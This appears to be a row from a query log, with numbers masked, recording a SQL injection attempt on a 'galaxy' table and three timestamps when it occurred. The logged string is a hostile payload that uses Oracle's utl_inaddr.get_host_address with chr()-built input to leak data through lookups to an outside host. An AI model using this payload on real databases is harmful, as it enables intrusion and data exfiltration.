3,select top # * from galaxy' or # = utl_inaddr.get_host_address ((chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) ||chr (#) )) --
2019-10-01 16:54:00,1
2019-10-20 18:26:00,1
2019-12-20 08:55:00,1
